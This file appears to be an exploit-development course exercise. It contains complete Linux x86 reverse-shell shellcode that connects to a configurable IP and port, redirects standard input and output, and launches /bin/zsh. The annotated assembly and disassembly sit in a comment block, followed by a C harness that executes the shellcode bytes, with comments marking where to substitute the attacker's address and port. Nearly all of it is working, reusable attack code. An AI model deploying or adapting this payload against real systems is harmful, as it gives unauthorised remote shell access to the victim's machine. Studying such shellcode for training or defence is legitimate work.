/*

;
; Linux x86
; Author:  thryb
; Date:    21-07-16
; Purpose: Reverse /bin/zsh to TCP port 9090
; Size:    80 bytes
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
;


global _start

section .text

_start:

	xor eax, eax ; cleaning registers
	xor ebx, ebx

	; 1 - create socket
        ; socket(AF_INET, SOCK_STREAM, 0);
        ; #define SYS_SOCKET      1               // sys_socket(2)
	push eax ; null terminate
	push byte 0x1 ; stack = 0, 1
	push byte 0x2 ; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
	mov al, 0x66 ; sys_socketcall = 102
	mov bl, 0x1 ; socketcall() socket = 1
	mov ecx, esp ; mv stack ptr into ecx
	int 0x80 ; init

	xchg esi, eax ; saving sockfd

	; 2 - Connect
	; connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

	mov al, 0x66 ; sys_socketcall = 102
	add ebx, 0x2 ; sys_connect = 3
	push 0xefffff7f ; 127.255.255.254 (ip2shell.py)
	push word 0x8223 ; 9090 (port2shell.py)
	push word 0x2 ; 2 AF_INET
	mov ecx, esp ; mv stack ptr to ecx
	push 0x10 ; addr leght 16
	push ecx ; ptr address
	push esi ; fd
	mov ecx, esp ;  mv final stack ptr to ecx
	int 0x80 ; init

	xchg eax, esi   ; save sockfd

        ; 3 - dup
        ; sys_dup2 = 63 = 0x3f

        xor ecx, ecx    ; NULL ecx
        add cl, 0x2     ; add 2 to counter

        dup2: ; STDIN, STDOUT, STDERR
                mov al, 0x3f    ; sys_dup2
                int 0x80        ; init
                dec cl          ; decrement counter
                jns dup2        ; Jump on No Sign (Positive)

	; 4 - execve /bin/zsh
        ; normal execve shell exec

        push eax ; null
        push 0x68737a2f ; hsz/
        push 0x6e69622f ; nib/
	mov ebx, esp ; mv stack ptr to ebx
	push eax ; null
	push ebx ; push ptr addr
	mov ecx, esp ; mv new stack ptr to ecx
        mov al, 0xb     ; sys_execve (11)
        int 0x80        ; init


============================================================================================================

No NULL

./reverse-zsh-tcp-9090.bin:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       31 db                   xor    %ebx,%ebx
 8048064:       50                      push   %eax
 8048065:       6a 01                   push   $0x1
 8048067:       6a 02                   push   $0x2
 8048069:       b0 66                   mov    $0x66,%al
 804806b:       b3 01                   mov    $0x1,%bl
 804806d:       89 e1                   mov    %esp,%ecx
 804806f:       cd 80                   int    $0x80
 8048071:       96                      xchg   %eax,%esi
 8048072:       b0 66                   mov    $0x66,%al
 8048074:       83 c3 02                add    $0x2,%ebx
 8048077:       68 7f ff ff ef          push   $0xefffff7f
 804807c:       66 68 23 82             pushw  $0x8223
 8048080:       66 6a 02                pushw  $0x2
 8048083:       89 e1                   mov    %esp,%ecx
 8048085:       6a 10                   push   $0x10
 8048087:       51                      push   %ecx
 8048088:       56                      push   %esi
 8048089:       89 e1                   mov    %esp,%ecx
 804808b:       cd 80                   int    $0x80
 804808d:       96                      xchg   %eax,%esi
 804808e:       31 c9                   xor    %ecx,%ecx
 8048090:       80 c1 02                add    $0x2,%cl

08048093 <dup2>:
 8048093:       b0 3f                   mov    $0x3f,%al
 8048095:       cd 80                   int    $0x80
 8048097:       fe c9                   dec    %cl
 8048099:       79 f8                   jns    8048093 <dup2>
 804809b:       50                      push   %eax
 804809c:       68 2f 7a 73 68          push   $0x68737a2f
 80480a1:       68 2f 62 69 6e          push   $0x6e69622f
 80480a6:       89 e3                   mov    %esp,%ebx
 80480a8:       50                      push   %eax
 80480a9:       53                      push   %ebx
 80480aa:       89 e1                   mov    %esp,%ecx
 80480ac:       b0 0b                   mov    $0xb,%al
 80480ae:       cd 80                   int    $0x80


*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x96\xb0\x66\x83\xc3\x02\x68"

// Replace IP here (use ip2shell.py to generate IP).
"\x7f\xff\xff\xef"
// *****************

"\x66\x68"

// Replace port here (use port2shell.py to generate IP).
"\x23\x82"
// *****************

"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x96\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}